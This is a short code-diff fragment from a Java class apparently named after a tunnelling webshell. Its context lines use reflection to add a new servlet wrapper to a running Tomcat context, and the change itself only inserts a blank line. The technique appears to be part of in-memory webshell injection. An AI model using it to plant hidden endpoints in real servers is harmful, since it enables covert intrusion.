@@ -297,6 +297,7 @@ public class RegeogTomServlet implements Servlet {
             standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
         }
 
+
         standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
 
         Method method;
